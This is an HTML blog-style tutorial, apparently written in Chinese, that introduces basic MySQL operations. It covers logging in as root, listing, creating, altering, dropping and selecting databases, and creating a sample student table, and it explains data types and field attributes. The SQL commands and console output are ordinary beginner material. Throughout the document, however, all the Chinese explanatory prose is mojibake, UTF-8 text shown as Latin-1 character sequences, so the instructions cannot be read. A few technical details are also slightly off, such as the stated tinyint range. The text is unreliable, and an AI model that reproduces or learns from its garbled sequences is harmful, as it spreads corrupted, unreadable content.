    <content><![CDATA[<h1 id="Mysqlæ•°æ®åº“"><a href="#Mysqlæ•°æ®åº“" class="headerlink" title="Mysqlæ•°æ®åº“"></a>Mysqlæ•°æ®åº“</h1><h4 id="1-ç†Ÿæ‚‰åŸºæœ¬çš„linuxä¸‹çš„å‘½ä»¤è¡Œï¼Œè¿ç”¨ä»–ä»¬ã€‚"><a href="#1-ç†Ÿæ‚‰åŸºæœ¬çš„linuxä¸‹çš„å‘½ä»¤è¡Œï¼Œè¿ç”¨ä»–ä»¬ã€‚" class="headerlink" title="1.ç†Ÿæ‚‰åŸºæœ¬çš„linuxä¸‹çš„å‘½ä»¤è¡Œï¼Œè¿ç”¨ä»–ä»¬ã€‚"></a>1.ç†Ÿæ‚‰åŸºæœ¬çš„linuxä¸‹çš„å‘½ä»¤è¡Œï¼Œè¿ç”¨ä»–ä»¬ã€‚</h4><a id="more"></a>

<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h5><p>äº†è§£ä¸€äº›åè¯ã€‚ï¼ˆèœé¸Ÿæ•™ç¨‹ä¸Šè§£é‡Šçš„å¾ˆæ¸…æ¥šï¼‰</p>
<ul>
<li><strong>æ•°æ®åº“:</strong> æ•°æ®åº“æ˜¯ä¸€äº›å…³è”è¡¨çš„é›†åˆã€‚</li>
<li><strong>æ•°æ®è¡¨:</strong> è¡¨æ˜¯æ•°æ®çš„çŸ©é˜µã€‚åœ¨ä¸€ä¸ªæ•°æ®åº“ä¸­çš„è¡¨çœ‹èµ·æ¥åƒä¸€ä¸ªç®€å•çš„ç”µå­è¡¨æ ¼ã€‚</li>
<li><strong>åˆ—:</strong> ä¸€åˆ—(æ•°æ®å…ƒç´ ) åŒ…å«äº†ç›¸åŒçš„æ•°æ®, ä¾‹å¦‚é‚®æ”¿ç¼–ç çš„æ•°æ®ã€‚</li>
<li><strong>è¡Œï¼š</strong>ä¸€è¡Œï¼ˆ=å…ƒç»„ï¼Œæˆ–è®°å½•ï¼‰æ˜¯ä¸€ç»„ç›¸å…³çš„æ•°æ®ï¼Œä¾‹å¦‚ä¸€æ¡ç”¨æˆ·è®¢é˜…çš„æ•°æ®ã€‚</li>
<li><strong>å†—ä½™</strong>ï¼šå­˜å‚¨ä¸¤å€æ•°æ®ï¼Œå†—ä½™é™ä½äº†æ€§èƒ½ï¼Œä½†æé«˜äº†æ•°æ®çš„å®‰å…¨æ€§ã€‚</li>
<li><strong>ä¸»é”®</strong>ï¼šä¸»é”®æ˜¯å”¯ä¸€çš„ã€‚ä¸€ä¸ªæ•°æ®è¡¨ä¸­åªèƒ½åŒ…å«ä¸€ä¸ªä¸»é”®ã€‚ä½ å¯ä»¥ä½¿ç”¨ä¸»é”®æ¥æŸ¥è¯¢æ•°æ®ã€‚</li>
<li><strong>å¤–é”®ï¼š</strong>å¤–é”®ç”¨äºå…³è”ä¸¤ä¸ªè¡¨ã€‚</li>
<li><strong>å¤åˆé”®</strong>ï¼šå¤åˆé”®ï¼ˆç»„åˆé”®ï¼‰å°†å¤šä¸ªåˆ—ä½œä¸ºä¸€ä¸ªç´¢å¼•é”®ï¼Œä¸€èˆ¬ç”¨äºå¤åˆç´¢å¼•ã€‚</li>
<li><strong>ç´¢å¼•ï¼š</strong>ä½¿ç”¨ç´¢å¼•å¯å¿«é€Ÿè®¿é—®æ•°æ®åº“è¡¨ä¸­çš„ç‰¹å®šä¿¡æ¯ã€‚ç´¢å¼•æ˜¯å¯¹æ•°æ®åº“è¡¨ä¸­ä¸€åˆ—æˆ–å¤šåˆ—çš„å€¼è¿›è¡Œæ’åºçš„ä¸€ç§ç»“æ„ã€‚ç±»ä¼¼äºä¹¦ç±çš„ç›®å½•ã€‚</li>
<li><strong>å‚ç…§å®Œæ•´æ€§:</strong> å‚ç…§çš„å®Œæ•´æ€§è¦æ±‚å…³ç³»ä¸­ä¸å…è®¸å¼•ç”¨ä¸å­˜åœ¨çš„å®ä½“ã€‚ä¸å®ä½“å®Œæ•´æ€§æ˜¯å…³ç³»æ¨¡å‹å¿…é¡»æ»¡è¶³çš„å®Œæ•´æ€§çº¦æŸæ¡ä»¶ï¼Œç›®çš„æ˜¯ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§</li>
<li><strong>è¡¨å¤´(header)</strong>: æ¯ä¸€åˆ—çš„åç§°;</li>
<li><strong>åˆ—(col):</strong> å…·æœ‰ç›¸åŒæ•°æ®ç±»å‹çš„æ•°æ®çš„é›†åˆ;</li>
<li><strong>è¡Œ(row):</strong> æ¯ä¸€è¡Œç”¨æ¥æè¿°æŸæ¡è®°å½•çš„å…·ä½“ä¿¡æ¯;</li>
<li><strong>å€¼(value):</strong> è¡Œçš„å…·ä½“ä¿¡æ¯, æ¯ä¸ªå€¼å¿…é¡»ä¸è¯¥åˆ—çš„æ•°æ®ç±»å‹ç›¸åŒ;</li>
<li><strong>é”®(key)</strong>: é”®çš„å€¼åœ¨å½“å‰åˆ—ä¸­å…·æœ‰å”¯ä¸€æ€§</li>
</ul>
<p><strong>é€€å‡º</strong></p>
<p><strong>exit</strong> æˆ– <strong>quit</strong>ã€‚</p>
<h4 id="1-mysql"><a href="#1-mysql" class="headerlink" title="1.mysql"></a><strong>1.mysql</strong></h4><p>MySQLåŸºç¡€çŸ¥è¯†<br>MySQLç»å¸¸å’Œâ€œæ•°æ®åº“â€è¿åœ¨ä¸€èµ·è¯»ï¼Œè¿™å¾ˆå®¹æ˜“å¯¹æ–°æ‰‹é€ æˆè¯¯è§£ï¼Œè®¤ä¸ºMySQLå°±æ˜¯ä¸€ä¸ªæ•°æ®åº“</p>
<p>å…¶å®ä¸æ˜¯è¿™æ ·ï¼ŒMySQLæ˜¯æ•°æ®åº“çš„é›†åˆï¼ŒMySQLé‡Œé¢æœ‰å¾ˆå¤šæ•°æ®åº“</p>
<p>é‚£ä¹ˆæ•°æ®æ˜¯ç›´æ¥å­˜åœ¨æ•°æ®åº“é‡Œçš„å—ï¼Ÿå¹¶ä¸ï¼Œæ•°æ®åº“åº•ä¸‹è¿˜æœ‰ä¸€ä¸ªå«åšæ•°æ®è¡¨çš„å­˜å‚¨å•å…ƒ</p>
<p>æ•°æ®è¡¨é‡Œé¢æ‰å­˜å‚¨æ•°æ®ã€‚</p>
<p>æ‰“ä¸ªæ¯”æ–¹ï¼Œå¥½æ¯”ä¸€åº§å¤§å›¾ä¹¦é¦†ï¼Œå°±æ˜¯MySQLï¼Œå›¾ä¹¦é¦†é‡Œé¢åˆ†å—åº“ï¼ŒåŒ—åº“ï¼Œè¿™å°±æ˜¯æ•°æ®åº“ï¼Œ</p>
<p>æ¯ä¸ªåº“é‡Œé¢çš„ä¹¦éƒ½æ˜¯æ”¾åœ¨ä¹¦æ¶ä¸Šçš„ï¼Œä¹¦æ¶å°±æ˜¯æ•°æ®è¡¨ï¼Œè€Œæ”¾åœ¨ä¹¦æ¶ä¸Šçš„å¾ˆå¤šæœ¬ä¹¦ï¼Œå°±æ˜¯æ•°æ®</p>
<p>ã€‚è¿™ä¹ˆè¯´ï¼Œè¯»è€…åº”è¯¥ç†è§£äº†å§ï¼Œæ‰€ä»¥æŒ‰å¤§å°é¡ºåºæ’ä¸ªåºå°±åº”è¯¥æ˜¯ï¼Œ</p>
<p><strong>MySQL&gt;æ•°æ®åº“&gt;æ•°æ®è¡¨&gt;æ•°æ®</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥çš„å†…å®¹ä¹Ÿæ˜¯æŒ‰ç…§è¿™ä¸ªé¡ºåºæ¥å±•å¼€ã€‚ï¼ˆæŠŠé»‘ä½“ç†è§£å°±å¥½ï¼‰</p>
<p>å‰é¢è·Ÿç€é¢œè€æ¿æŠŠé‚£ä¸ªç¯å¢ƒå®‰è£…å¥½äº†ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨mysqläº†ã€‚é¦–å…ˆæ‰“å¼€xshellï¼Œ</p>
<h5 id="1-è¿›å…¥ä½ çš„mysql"><a href="#1-è¿›å…¥ä½ çš„mysql" class="headerlink" title="1.è¿›å…¥ä½ çš„mysql"></a>1.è¿›å…¥ä½ çš„mysql</h5><p><strong>mysql -u root -p</strong> #ç„¶å[root@<strong><em>*</em>*</strong> ~]åé¢è¾“å…¥</p>
<p>-u æ˜¯æŒ‡userç”¨æˆ·åï¼Œ</p>
<p>rootæ˜¯ä½ åˆ›å»ºäº†ä¸€ä¸ªrootç”¨æˆ·ï¼Œæœ€é«˜ç®¡ç†å‘˜è¿›å…¥ã€‚</p>
<p>-pæ˜¯è¦ä½ è¾“å…¥ä½ çš„mysqlå¯†ç ã€‚</p>
<p>#å›è½¦Enter password: ç„¶åè¾“å…¥ä½ çš„å¯†ç </p>
<p>#ï¼ˆè¿™é‡Œä½ è¾“å…¥çš„æ—¶å€™æ˜¯çœ‹ä¸è§çš„ï¼Œlinuxæ˜¯æœ‰è¿™ä¸ªä¿æŠ¤ï¼Œä»¥å…æ³„å¯†ï¼Œwindowsç³»ç»Ÿä¸‹ä¸€èˆ¬ä¸ä¼š</p>
<p>æœ‰è¿™ä¸ªã€‚è¾“å…¥åç„¶åå›è½¦ã€‚ï¼‰</p>
<p>è®²è§£rootä¸ºä»€ä¹ˆï¼Œè¿™æ˜¯ç®¡ç†å‘˜ç™»å½•ï¼Œå¯ä»¥è¿›è¡Œå¥½å¤šæ“ä½œï¼Œå¢åˆ æ”¹æŸ¥ã€‚</p>
<p>ä½ ä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªç”¨æˆ·ä¸æ˜¯rootã€‚ç„¶åç»™ä»–æƒé™ï¼Œè¿›è¡Œç™»å½•ã€‚å…·ä½“å¯ä»¥å‚ç…§</p>
<p>ï¼ˆèœé¸Ÿæ•™ç¨‹/æ•°æ®åº“/mysql/mysqlç®¡ç†ï¼‰ï¼Œ</p>
<p>å°±æœ‰è¿™ä¸ªå‡ºç°ï¼Œæœ‰çš„ç‰ˆæœ¬ä¸ä¸€æ ·ï¼Œä½†æ˜¯å¤§è‡´æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>Welcome to the MySQL monitor. Commands end with ; or \g.<br>Your MySQL connection id is 2<br>Server version: 5.7.25-log MySQL Community Server (GPL)</p>
<p>Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights</p>
<p>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.</p>
<p>Type â€˜help;â€™ or â€˜\hâ€™ for help. Type â€˜\câ€™ to clear the current inpu.</p>
<p>MySQL [(none)] &gt;</p>
<p>MySQL [(none)] &gt;è¿™ä¸ªnoneæ˜¯ä½ è¿˜æ²¡æœ‰é€‰æ‹©æ•°æ®åº“ã€‚æœ‰çš„ç‰ˆæœ¬æœ‰æœ‰çš„æ²¡æœ‰ã€‚</p>
<p>é€‰æ‹©äº†æ•°æ®åº“å°±æ˜¯MySQL [(xx)] &gt;.</p>
<h5 id="2-å±•ç¤ºä½ çš„æ•°æ®åº“"><a href="#2-å±•ç¤ºä½ çš„æ•°æ®åº“" class="headerlink" title="2.å±•ç¤ºä½ çš„æ•°æ®åº“"></a>2.å±•ç¤ºä½ çš„æ•°æ®åº“</h5><p><strong>show databases;</strong> #å› ä¸ºä½ ä¸çŸ¥é“ä½ åˆšå¼€å§‹æœ‰å¤šå°‘çš„æ•°æ®åº“ï¼Œæ‰€ä»¥æ˜¯databases</p>
<p><strong>è€Œä¸”ä¸€å®šè¦è®°ä½ï¼Œè¾“å…¥ï¼›</strong>å› ä¸ºä¹‹å‰é…ç¯å¢ƒçš„æ—¶å€™çš„è¯­å¥æ²¡æœ‰åé¢åŠ ;çš„ä¹ æƒ¯ï¼Œæ‰€ä»¥èœé¸¡æœ¬é¸¡åˆšå¼€å§‹çš„æ—¶å€™å°±å¸¸å¸¸å¿˜è®°åŠ ï¼›å¯¼è‡´å®ƒä»¥ä¸ºæˆ‘è¿˜æœ‰ä¸œè¥¿è¦è¾“å…¥ï¼Œå¦èµ·ä¸€è¡Œã€‚</p>
<p>å‡ºç°è¿™å››ä¸ªåˆå§‹æ•°æ®åº“</p>
<p>+â€”â€”â€”â€”â€”â€”â€“+<br>| Database |<br>+â€”â€”â€”â€”â€”â€”- -+<br>| information_schema |<br>| mysql |<br>| performance_schema |<br>| sys |<br>+â€”â€”â€”â€”â€”â€”â€“+</p>
<h5 id="3-åˆ›å»ºä½ çš„æ•°æ®åº“"><a href="#3-åˆ›å»ºä½ çš„æ•°æ®åº“" class="headerlink" title="3.åˆ›å»ºä½ çš„æ•°æ®åº“"></a>3.åˆ›å»ºä½ çš„æ•°æ®åº“</h5><p><strong>create database XX;</strong> (XXæ˜¯æ•°æ®åº“å)è¿™ä¸ªæ•°æ®åº“åä½ å¯ä»¥éšä¾¿å–ï¼Œä½†æ˜¯ä¸èƒ½å–ä¸€äº›å…³é”®å­—ï¼Œä¾‹å¦‚create showç±»ä¼¼çš„</p>
<p>è¾“å…¥åå›è½¦ç„¶åçœ‹è§</p>
<p><strong>Query OK,1 row affected (0.00 sec)</strong> #è¡¨ç¤ºåˆ›å»ºæ•°æ®åº“æˆåŠŸã€‚</p>
<p>åœ¨è¿™é‡Œç»™å¤§å®¶è¡¥å……ä¸€ç‚¹ï¼Œåˆ›å»ºæ•°æ®åº“çš„æ—¶å€™ï¼Œé»˜è®¤çš„å­—ç¬¦æ˜¯â€latinâ€œï¼Œä¹Ÿå°±æ˜¯æ‹‰ä¸æ–‡ï¼Œç°åœ¨å¯èƒ½ä½“ä¼šä¸åˆ°æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œåˆ°æ•°æ®è¡¨çš„æ“ä½œçš„æ—¶å€™å°±æœ‰åŒºåˆ«äº†ã€‚</p>
<p>ä¸è¿‡è¿™é‡Œè¿˜æ˜¯å‘Šè¯‰å¤§å®¶ï¼Œå¦‚ä½•åˆ›å»ºæ•°æ®åº“çš„æ—¶å€™ï¼Œè‡ªå·±å®šä¹‰ä¸ºä»€ä¹ˆå­—ç¬¦</p>
<p><strong>create database XX(æ•°æ®åº“å) charset = (å­—ç¬¦ç¼–ç ï¼Œä¾‹å¦‚utf8);</strong></p>
<p>#æˆ‘ä»¬å¹³æ—¶å­¦çš„ä¸­æ–‡çš„å­—ç¬¦ç¼–ç æ˜¯â€œutf-8â€ï¼Œä½†æ˜¯åœ¨MySQLé‡Œé¢ï¼Œä¸­æ–‡å­—ç¬¦ç¼–ç æ˜¯â€œutf8â€ï¼Œè¿™ç‚¹éœ€è¦æ³¨æ„ã€‚</p>
<p>è¿˜æœ‰ä¸€ç‚¹ï¼Œè¦æ˜¯ä½ åˆ›å»ºä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ•°æ®åº“ä¼šæŠ¥é”™ã€‚ä¾‹å¦‚ï¼š</p>
<p><strong>create database test;</strong></p>
<p>ä¼šæç¤ºä»¥ä¸‹ä¿¡æ¯</p>
<p><strong>canâ€™t create database â€˜testâ€™ ;database exists</strong></p>
<p>æ‰€ä»¥æˆ‘ä»¬åœ¨åˆ›å»ºæ•°æ®åº“çš„æ—¶å€™æœ€å¥½åˆ¤æ–­ä¸€ä¸‹å­ï¼Œä½ è¦åˆ›å»ºçš„æ•°æ®åº“åˆ°åº•å­˜ä¸å­˜åœ¨ã€‚</p>
<p><strong>create database if not exists XX(æ•°æ®åº“å);</strong> #å°è¯•åˆ›ä¸€ä¸ªtestçš„æ•°æ®åº“è¯•è¯•</p>
<p>ä¼šå‡ºç°<strong>Query ok,1 row affected ,1 warning.</strong></p>
<p>æ˜¾ç¤ºâ€œOKâ€ï¼Œæ²¡æœ‰æŠ¥é”™äº†ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªè­¦å‘Šï¼Œè¿™ä¸ªè­¦å‘Šå°±æ˜¯å‘Šè¯‰ç”¨æˆ·ï¼Œâ€testâ€œè¿™ä¸ªæ•°æ®åº“å­˜åœ¨ã€‚</p>
<p>ç°åœ¨è®©æˆ‘ä»¬å°è¯•ä¸€ä¸‹åˆ›å»ºä¸€ä¸ªå…³é”®å­—çš„æ•°æ®åº“ï¼Œ</p>
<p><strong>create database create;</strong></p>
<p>ä¼šå‡ºç°<strong>You have an error in your SQL syntax;check the manual that correspands to your â€¦â€¦â€¦â€¦â€¦â€¦.to use near â€˜createâ€™ at line 1</strong> è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç¡®å®çœ‹åˆ°çš„æ˜¯ï¼Œåä¸ºâ€œcreateâ€çš„è¿™ä¸ªæ•°æ®åº“æ²¡æœ‰åˆ›å»ºæˆåŠŸï¼ŒæŠ¥é”™äº†.</p>
<p>é‚£å¦‚æœæœ‰çš„äººè¯´æˆ‘å°±æƒ³åˆ›å»ºä¸€ä¸ªåä¸ºâ€œcreateâ€çš„æ•°æ®åº“ï¼Œä¸‹é¢ç»™å‡ºè§£å†³åŠæ³•</p>
<p>**create database <code>XX</code>(æ•°æ®åº“å);(**æ³¨æ„ï¼Œè¿™é‡Œ``æ˜¯åå¼•å·ï¼Œåœ¨é”®ç›˜tabä¸Šé¢,1çš„æ—è¾¹)</p>
<p>è¿™æ ·æ“ä½œå°±å¯ä»¥åˆ›å»ºä¸€ä¸ªåå«åšcreateçš„æ•°æ®åº“äº†ï¼Œä½†æ˜¯æœ€å¥½ä¸è¦èµ·è¿™äº›å…³é”®å­—åå­—ï¼Œä¸å¥½åŒºåˆ«ã€‚</p>
<h5 id="4-æ˜¾ç¤ºæ•°æ®åº“ä¿¡æ¯"><a href="#4-æ˜¾ç¤ºæ•°æ®åº“ä¿¡æ¯" class="headerlink" title="4.æ˜¾ç¤ºæ•°æ®åº“ä¿¡æ¯"></a>4.æ˜¾ç¤ºæ•°æ®åº“ä¿¡æ¯</h5><p><strong>show create database XX(æ•°æ®åº“å);</strong></p>
<p>æŸ¥çœ‹ä¿¡æ¯ã€‚CHARACTER SET</p>
<p>å½“ç„¶åœ¨è¿™é‡Œä½ å¯ä»¥ä¿®æ”¹ä½ çš„å­—ç¬¦ç¼–ç ã€‚ä½¿ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alter database dbname CHARACTER SET utf8 COLLATE utf8_general_ci;</span><br><span class="line">utf8_general_ciè¿™æ˜¯ä¸€ä¸ªæ ¡å¯¹è§„åˆ™ã€‚</span><br><span class="line"></span><br><span class="line">ç„¶ååœ¨ä½¿ç”¨å“ªä¸ªæŸ¥çœ‹æ•°æ®åº“å°±å¯ä»¥çœ‹åˆ°ï¼Œä½ çš„æ•°æ®åº“çš„ç¼–ç å°±å˜æˆäº†utf8;</span><br></pre></td></tr></table></figure>
<h5 id="5-åˆ é™¤æ•°æ®åº“"><a href="#5-åˆ é™¤æ•°æ®åº“" class="headerlink" title="5.åˆ é™¤æ•°æ®åº“"></a>5.åˆ é™¤æ•°æ®åº“</h5><p><strong>drop database XX(æ•°æ®åº“å);</strong></p>
<p>åˆ é™¤äº†ä¼šæ˜¾ç¤º</p>
<p><strong>Query ok, 0 rows affected</strong> #è¿™æ ·å°±æ˜¾ç¤ºåˆ é™¤æˆåŠŸäº†ã€‚</p>
<p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬è¦åˆ é™¤ä¸€ä¸ªå¹¶ä¸å­˜åœ¨çš„æ•°æ®åº“ä¼šå‡ºç°ä»€ä¹ˆå‘¢</p>
<p>åˆ é™¤ä¸€ä¸ªä¸å­˜åœ¨çš„qæ•°æ®åº“ã€‚å›è½¦æ˜¾ç¤º</p>
<p><strong>canâ€™t drop database â€˜qâ€™; database doesnoâ€™t exist</strong></p>
<p>å¾ˆæ˜æ˜¾ï¼ŒæŠ¥é”™äº†ï¼Œå› ä¸ºä¸å­˜åœ¨â€œaâ€è¿™ä¸ªæ•°æ®åº“ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¤æ–­ä¸€ä¸‹ï¼Œè¿™ä¸ªæ•°æ®åº“å­˜åœ¨æ‰åˆ é™¤ï¼Œä¸‹é¢ç»™å‡ºä»£ç ã€‚è·Ÿåˆ›å»ºä¸€æ ·çš„</p>
<p><strong>drop database if exists XX (æ•°æ®åº“åå­—);</strong></p>
<p>ä¼šæ˜¾ç¤º</p>
<p>Query OK, 0 rows affected, 1 warning (0.01 sec)</p>
<p>å’Œä¹‹å‰åˆ›å»ºä¸€æ ·ï¼Œè™½ç„¶æ˜¯æˆåŠŸçš„ï¼Œä½†æ˜¯æœ‰è­¦å‘Šã€‚è­¦å‘Šçš„æ„æ€å¤§æ¦‚æ˜¯è¯´ï¼Œä¹ˆæœ‰è¿™ä¸ªæ•°æ®åº“ï¼Œã€‚ã€‚</p>
<h5 id="6-é€‰æ‹©æ•°æ®åº“"><a href="#6-é€‰æ‹©æ•°æ®åº“" class="headerlink" title="6.é€‰æ‹©æ•°æ®åº“"></a>6.é€‰æ‹©æ•°æ®åº“</h5><p>è¿™æ˜¯æ•°æ®åº“çš„æœ€åä¸€ä¸ªåŸºæœ¬æ“ä½œï¼Œæˆ‘ä»¬å¦‚æœæƒ³è¦åˆ›å»ºæ•°æ®ï¼Œå¿…é¡»è¦åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ï¼Œç„¶ååœ¨æ•°æ®åº“å½“ä¸­åˆ›å»ºæ•°æ®è¡¨ï¼Œåœ¨æ•°æ®è¡¨ä¸­è¿›è¡Œæ“ä½œï¼Œ</p>
<p>ä½†æ˜¯è¿™ä¹ˆå¤šæ•°æ®åº“ï¼Œè®¡ç®—æœºæ€ä¹ˆçŸ¥é“æˆ‘ä»¬é€‰æ‹©çš„æ˜¯å“ªä¸ªæ•°æ®åº“å‘¢ï¼Ÿæˆ‘ä»¬ä½¿ç”¨ä¸‹åˆ—è¯­å¥</p>
<p><strong>use XX(æ•°æ®åº“å);</strong></p>
<p>å›è½¦åä¼šæ˜¾ç¤º</p>
<p><strong>Database changed</strong></p>
<p>è¿™ä¸ªå°±æç¤ºä½ å·²ç»è¿›å…¥åˆ°äº†è¿™ä¸ªXXæ•°æ®åº“é‡Œé¢äº†ã€‚ç„¶åä½ å°±å¯ä»¥æ“ä½œäº†ã€‚</p>
<h3 id="æ•°æ®è¡¨"><a href="#æ•°æ®è¡¨" class="headerlink" title="æ•°æ®è¡¨"></a>æ•°æ®è¡¨</h3><p>æ•°æ®è¡¨çš„åŸºæœ¬æ“ä½œå…¨éƒ½æ˜¯åœ¨é€‰æ‹©äº†æ•°æ®åº“çš„å‰æä¸‹,ä¸€å®šè¦åœ¨é€‰æ‹©äº†æ•°æ®åº“çš„å‰æä¸‹ã€‚</p>
<h5 id="1-åˆ›å»ºè¡¨"><a href="#1-åˆ›å»ºè¡¨" class="headerlink" title="1.åˆ›å»ºè¡¨"></a>1.åˆ›å»ºè¡¨</h5><p><strong>create table XX(è¡¨å)(</strong><br><strong>å­—æ®µ1å æ•°æ®ç±»å‹ï¼Œ</strong><br><strong>å­—æ®µ2å æ•°æ®ç±»å‹,</strong><br><strong>â€¦â€¦.</strong><br><strong>å­—æ®µnå æ•°æ®ç±»å‹</strong><br><strong>);</strong></p>
<p>è¿™ä¸ªåˆ›å»ºè¡¨å¯ä»¥æ‰“ä¸ªæ¯”æ–¹ï¼Œå¦‚æœè¦ä½ ç”¨Excelåšä¸€ä»½ç­çº§æˆç»©è¡¨ï¼Œä½ ä¼šæ€ä¹ˆåšï¼Ÿè‚¯å®šå…ˆæœ‰ä¸ªæ ‡é¢˜å§ï¼Œæ¯”æ–¹è¯´â€œ18çº§ç½‘ç»œäºŒç­æœŸæœ«æˆç»©è¡¨â€ï¼Œè¿™é‡Œçš„æ ‡é¢˜å°±ç›¸å½“äºæˆ‘ä»¬çš„è¡¨åã€‚æ ‡é¢˜æœ‰äº†ï¼Œæˆ‘ä»¬å¾—åœ¨ç¬¬ä¸€è¡Œå†™ä¸Šâ€œå­¦å·â€ã€â€œå§“åâ€ã€â€œæ€»æˆç»©â€å§ï¼Œæ¥å‘Šè¯‰çœ‹è¿™ä¸ªè¡¨çš„äººï¼Œæ¯ä¸€åˆ—ä»£è¡¨çš„ä»€ä¹ˆä¸œè¥¿ï¼Œè¿™é‡Œçš„â€œå­¦å·â€ã€â€œå§“åâ€ã€â€œæ€»æˆç»©â€å°±ç›¸å½“äºæˆ‘ä»¬çš„å­—æ®µåã€‚åˆ°è¿™é‡Œï¼Œéƒ½è¿™åº”è¯¥å¯¹è¿™æ®µä»£ç æœ‰æ‰€äº†è§£äº†ï¼Œä¸‹é¢æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ•°æ®è¡¨ã€‚</p>
<p><strong>My</strong>SQL [qq1]&gt; create table stu(<br><strong>-&gt; id varchar(20),</strong><br><strong>-&gt; name varchar(10),</strong><br><strong>-&gt; score int</strong><br>-&gt; );</p>
<p>å›è½¦ä¹‹åæ˜¾ç¤º</p>
<p><strong>Query OK, 0 rows affected (0.09 sec)</strong></p>
<p>è¡¨ç¤ºå·²ç»æˆåŠŸåˆ›å»ºä¸€ä¸ªè¡¨äº†ã€‚è¿™é‡Œæ³¨æ„å†™ä¸€è¡Œåˆ«å¿˜è®° , å’Œæœ€åçš„ ï¼›ä¸ç„¶å‡ºé”™äº†åˆè¦é‡æ–°æ•²ä¸€æ¬¡ã€‚</p>
<p>è¿™é‡Œè®²ä¸€è®²mysqlæ•°æ®ç±»å‹çš„çŸ¥è¯†ã€‚</p>
<p>æ•°æ®ç±»å‹ï¼šint æ•´å‹<br>tinyint æ•´å‹ï¼ˆ0-256ï¼‰<br>decimal æµ®ç‚¹å‹ï¼ˆæ€»ä½æ•°ï¼Œå°æ•°ä½æ•°ï¼‰ ä¾‹å¦‚ decimal(3,1)<br>char(X) å®šé•¿å­—ç¬¦å‹ ä¾‹å¦‚ char(10)<br>varchar(X) å¯å˜é•¿åº¦å­—ç¬¦å‹ ä¾‹å¦‚varcharï¼ˆ10ï¼‰<br>text å¤§æ®µæ–‡æœ¬</p>
<p> binary äºŒè¿›åˆ¶ï¼ˆå­˜å‚¨ç…§ç‰‡ç­‰ï¼‰</p>
<p>å’ŒCè¯­è¨€ç±»ä¼¼ã€‚</p>
<p>å­—æ®µå±æ€§ï¼š</p>
<p>null:ç©º<br>not null:ä¸ä¸ºç©º<br>default â€˜XXXXâ€™ï¼šé»˜è®¤å€¼<br>auto_incrementï¼šè‡ªåŠ¨å¢é•¿<br>primary keyï¼šä¸»é”®(ä¸»é”®çš„ç‰¹ç‚¹ï¼Œä¸ä¸ºç©ºï¼Œä¸é‡å¤,ä¸€ä¸ªè¡¨åªèƒ½æœ‰ä¸€ä¸ªä¸»é”®ï¼Œä½†æ˜¯ä¸€ä¸ªä¸»é”®å¯ä»¥ç”±å¤šä¸ªåˆ—ç»„æˆ)</p>
<p>å…·ä½“çš„æ²¡å¿…è¦å¤šè¯´ï¼Œåªè¦äº†è§£å¸¸ç”¨çš„æ•°æ®ç±»å‹å³å¯ã€‚ç°åœ¨æˆ‘å¯ä»¥è®²è®²â€œLatinâ€å’Œâ€œutf8â€çš„åŒºåˆ«äº†ï¼Œå¦‚æœæ˜¯åœ¨â€œLatinâ€å­—ç¬¦ä¸‹åˆ›å»ºçš„æ•°æ®è¡¨ï¼Œé‚£ä¹ˆä¸€ä¸ªä¸­æ–‡ç­‰äºä¸¤ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±ç›¸å½“äºï¼Œå¦‚æœåå­—æ˜¯å››ä¸ªå­—ï¼Œå°±è¦charï¼ˆ8ï¼‰ã€‚ä½†å¦‚æœæ˜¯åœ¨â€œutf8â€å­—ç¬¦ä¸‹åˆ›å»ºçš„æ•°æ®è¡¨ï¼Œä¸€ä¸ªä¸­æ–‡ç­‰äºä¸€ä¸ªå­—ç¬¦ï¼Œå¦‚æœåå­—æ˜¯å››ä¸ªå­—ï¼Œåªéœ€è¦charï¼ˆ4ï¼‰å°±å¤Ÿäº†ã€‚</p>
<p>è¿˜æœ‰å¦‚æœä½ è¿˜æ˜¯è¦ç”¨å…³é”®å­—åˆ›å»ºå­—æ®µåæˆ–è€…è¡¨åçš„è¯ï¼Œå’Œä¹‹å‰ä¸€æ ·è¦ç”¨``</p>
<h5 id="2-æŸ¥çœ‹è¡¨"><a href="#2-æŸ¥çœ‹è¡¨" class="headerlink" title="2.æŸ¥çœ‹è¡¨"></a>2.æŸ¥çœ‹è¡¨</h5><p><strong>show tables;</strong></p>
<p>ä¸€å®šè¦æ˜¯tablesï¼Œå› ä¸ºä¸€ä¸ªMySQLé‡Œé¢æœ‰å¤šä¸ªæ•°æ®åº“ï¼Œæ‰€ä»¥ï¼Œä¸€ä¸ªæ•°æ®åº“é‡Œé¢ä¹Ÿå¯ä»¥æœ‰å¤šä¸ªè¡¨ï¼Œå½“ç„¶ï¼Œä¸€ä¸ªè¡¨é‡Œé¢ä¹Ÿå¯ä»¥æœ‰å¤šä¸ªæ•°æ®ï¼Œä½†æ˜¯åªæœ‰ä¸€ä¸ªè¡¨çš„è¯ï¼Œä¹Ÿè¦ä½¿ç”¨tablesï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨åé¢çš„æ˜¾ç¤ºåˆ›å»ºçš„è¡¨ã€‚</p>
<p>å›è½¦ä¹‹åä¼šæ˜¾ç¤ºä½ åˆšåˆšåˆ›å»ºçš„è¡¨</p>
<p>+â€”â€”â€”â€”â€”+<br>| Tables_in_qq1 |<br>+â€”â€”â€”â€”â€”+<br>| stu |<br>+â€”â€”â€”â€”â€”+<br>1 row in set (0.00 sec)</p>
